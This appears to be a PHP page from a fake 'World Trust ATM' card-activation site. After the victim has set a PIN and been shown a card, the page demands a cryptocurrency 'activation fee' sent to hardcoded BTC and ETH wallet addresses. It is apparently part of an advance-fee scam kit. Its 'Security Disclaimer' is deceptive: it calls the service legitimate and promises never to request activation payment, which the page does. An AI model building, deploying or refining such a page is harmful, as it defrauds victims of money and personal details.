<?php
/**
 * World Trust ATM - Card Activation
 * Payment Page - Activation Fee
 */

require_once 'includes/config.php';
require_once 'includes/functions.php';
require_once 'includes/database.php';

// Check session - must have come from card-display.php
check_user_session();
check_session_timeout();

// Check if card details exist (must have completed pin-setup and card-display)
if (!isset($_SESSION['card_number'])) {
    header('Location: card-display.php');
    exit();
}

$user_name = get_full_name();
$request_id = $_SESSION['request_id'] ?? null;

// Handle payment method selection
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['payment_method'])) {
    $payment_method = sanitize_input($_POST['payment_method']);
    $payment_address = sanitize_input($_POST['payment_address'] ?? '');
    
    if ($request_id && in_array($payment_method, ['btc', 'eth', 'usdt'])) {
        // Save payment method to database
        update_payment_info($request_id, $payment_method, $payment_address);
        
        // Set session flag for payment confirmation
        $_SESSION['payment_confirmed'] = true;
        
        // Redirect to activation PIN verification page
        header('Location: activation-verify.php');
        exit();
    }
}

// Cryptocurrency wallet addresses (placeholders)
$wallet_addresses = [
    'btc' => 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh',
    'eth' => '0x742d35Cc6634C0532925a3b844Bc9e7595f0bEbb',
    'usdt' => '0x742d35Cc6634C0532925a3b844Bc9e7595f0bEbb'
];

$activation_fee = ACTIVATION_FEE;
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo APP_NAME; ?> - Activation Fee Payment</title>
    <link rel="stylesheet" href="css/styles.css">
</head>
<body>
    <div class="container">
        <!-- Header -->
        <header class="header">
            <h1 class="logo"><?php echo APP_NAME; ?></h1>
            <p class="tagline"><?php echo APP_TAGLINE; ?></p>
        </header>

        <!-- Payment Container -->
        <div class="payment-container">
            <h2 class="form-title">Card Activation Fee Required</h2>
            <p class="form-subtitle">Complete your payment to activate your card</p>
            
            <!-- Alert Message -->
            <div class="alert-box alert-warning">
                <h3 style="margin-bottom: 10px; font-size: 18px; color: #856404;">⚠️ Payment Required</h3>
                <p style="color: #856404; margin-bottom: 15px; line-height: 1.6;">
                    To complete your card activation, you need to pay an activation fee of <strong style="font-size: 20px;">$<?php echo number_format($activation_fee, 2); ?></strong>
                </p>
                <p style="color: #856404; font-size: 14px;">
                    This is a one-time fee required to activate your World Trust ATM card and enable all features.
                </p>
            </div>

            <!-- Reference Information -->
            <div class="info-box" style="margin-bottom: 30px;">
                <div class="info-item">
                    <span class="info-label">Reference ID:</span>
                    <span class="info-value"><?php echo str_pad($request_id ?? '000', 6, '0', STR_PAD_LEFT); ?></span>
                </div>
                <div class="info-item">
                    <span class="info-label">Cardholder:</span>
                    <span class="info-value"><?php echo htmlspecialchars($user_name); ?></span>
                </div>
                <div class="info-item">
                    <span class="info-label">Activation Fee:</span>
                    <span class="info-value" style="color: var(--error-red); font-size: 16px;">$<?php echo number_format($activation_fee, 2); ?></span>
                </div>
            </div>

            <!-- Payment Method Selection -->
            <div class="payment-section">
                <h3 class="section-title">Select Payment Method</h3>
                <p style="color: var(--text-light); font-size: 14px; margin-bottom: 20px;">
                    Choose your preferred cryptocurrency to complete the payment
                </p>

                <div class="payment-methods">
                    <label class="payment-method-option">
                        <input type="radio" name="payment_method" value="btc" class="payment-radio">
                        <div class="payment-method-card">
                            <div class="crypto-icon">₿</div>
                            <div class="crypto-name">Bitcoin</div>
                            <div class="crypto-symbol">BTC</div>
                        </div>
                    </label>

                    <label class="payment-method-option">
                        <input type="radio" name="payment_method" value="eth" class="payment-radio">
                        <div class="payment-method-card">
                            <div class="crypto-icon">Ξ</div>
                            <div class="crypto-name">Ethereum</div>
                            <div class="crypto-symbol">ETH</div>
                        </div>
                    </label>

                    <label class="payment-method-option">
                        <input type="radio" name="payment_method" value="usdt" class="payment-radio">
                        <div class="payment-method-card">
                            <div class="crypto-icon">₮</div>
                            <div class="crypto-name">Tether</div>
                            <div class="crypto-symbol">USDT (ERC-20)</div>
                        </div>
                    </label>
                </div>
            </div>

            <!-- Payment Details (Hidden initially) -->
            <div class="payment-details" id="paymentDetails" style="display: none;">
                <h3 class="section-title">Payment Instructions</h3>
                
                <div class="payment-instruction-box">
                    <p style="color: var(--text-dark); font-size: 15px; margin-bottom: 15px; font-weight: 500;">
                        Send exactly <strong style="color: var(--error-red); font-size: 18px;">$<?php echo number_format($activation_fee, 2); ?></strong> worth of <strong id="selectedCryptoName"></strong> to the address below:
                    </p>

                    <!-- QR Code -->
                    <div class="qr-code-container">
                        <img id="qrCode" src="" alt="QR Code" class="qr-code">
                    </div>

                    <!-- Wallet Address -->
                    <div class="wallet-address-container">
                        <label class="wallet-label">Wallet Address:</label>
                        <div class="wallet-address-box">
                            <input type="text" id="walletAddress" class="wallet-address-input" readonly>
                            <button type="button" id="copyBtn" class="copy-btn" onclick="copyAddress()">
                                📋 Copy
                            </button>
                        </div>
                        <p id="copyMessage" class="copy-message" style="display: none;">✓ Address copied to clipboard!</p>
                    </div>

                    <!-- Important Notes -->
                    <div class="alert-box" style="margin-top: 20px;">
                        <h4 style="color: #856404; margin-bottom: 10px; font-size: 14px;">Important Notes:</h4>
                        <ul style="color: #856404; font-size: 13px; line-height: 1.8; margin: 0; padding-left: 20px;">
                            <li>Send <strong>ONLY</strong> <span id="selectedCryptoSymbol"></span> to this address</li>
                            <li>Sending any other cryptocurrency will result in permanent loss of funds</li>
                            <li>Network fees are separate and paid by you</li>
                            <li>Payment confirmation may take 10-60 minutes depending on network congestion</li>
                            <li>Keep your Reference ID for transaction inquiries</li>
                        </ul>
                    </div>
                </div>

                <!-- Confirmation Button -->
                <button type="button" class="btn btn-primary" id="confirmPaymentBtn" onclick="confirmPayment()">
                    I Have Completed the Payment
                </button>
            </div>

            <!-- Hidden data for JavaScript -->
            <input type="hidden" id="btcAddress" value="<?php echo $wallet_addresses['btc']; ?>">
            <input type="hidden" id="ethAddress" value="<?php echo $wallet_addresses['eth']; ?>">
            <input type="hidden" id="usdtAddress" value="<?php echo $wallet_addresses['usdt']; ?>">
        </div>
        
        <!-- Disclaimer -->
        <div class="disclaimer">
            <div class="disclaimer-title">Security Disclaimer</div>
            <p>This is a legitimate card activation service. We will never ask for your PIN, full card number via email/text, or request payment to activate your card. Always verify you're on the correct website URL (https://[yoursite.com]) before entering any information.  If you receive suspicious emails or calls claiming to be from us, do not provide any personal information and contact our security team immediately at [security phone/email]. Your data is protected with bank-level encryption and will never be sold to third parties. </p>
        </div>
    </div>
    
    <script src="js/payment.js"></script>
</body>
</html>
